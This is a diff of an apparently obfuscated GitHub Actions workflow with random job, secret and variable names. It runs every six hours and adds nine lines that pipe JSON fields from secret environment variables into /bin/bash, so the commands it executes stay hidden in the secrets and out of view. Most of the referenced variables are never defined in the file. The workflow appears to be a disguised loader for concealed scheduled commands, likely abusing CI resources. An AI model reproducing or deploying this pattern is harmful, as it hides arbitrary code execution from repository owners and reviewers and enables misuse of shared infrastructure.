@@ -1,10 +1,10 @@
 name: timberheadimprobable
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
-jobs:  # 32321
+    - cron: '53 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,10 +12,15 @@ jobs:  # 32321
       - uses: actions/checkout@v4
       - name: timberheadimprobable
         env:
-          otir265: ${{ secrets.otir265 }}
+          gtqc9851: ${{ secrets.gtqc9851 }}
         run: |
-          echo $otir265 | jq -r .bzxkj35096 | /bin/bash
-          echo $ufyf83 | jq -r .vlhov21 | /bin/bash
-          echo $rcb2352 | jq -r .fsllh2127 | /bin/bash
-          echo $j9471 | jq -r .pzhb28 | /bin/bash
+          echo $gtqc9851 | jq -r .wnai1781 | /bin/bash
+          echo $rhpsg24787 | jq -r .rsmxe25606 | /bin/bash
+          echo $zecoh24 | jq -r .pdax1701 | /bin/bash
+          echo $ulp90822 | jq -r .tskp96267 | /bin/bash
+          echo $ron3 | jq -r .g5 | /bin/bash
+          echo $sv5949 | jq -r .bvr9 | /bin/bash
+          echo $wgbm629 | jq -r .nxia3745 | /bin/bash
+          echo $fnnp01024 | jq -r .nfc6613 | /bin/bash
+          echo $umw0632 | jq -r .udxkm30 | /bin/bash
 
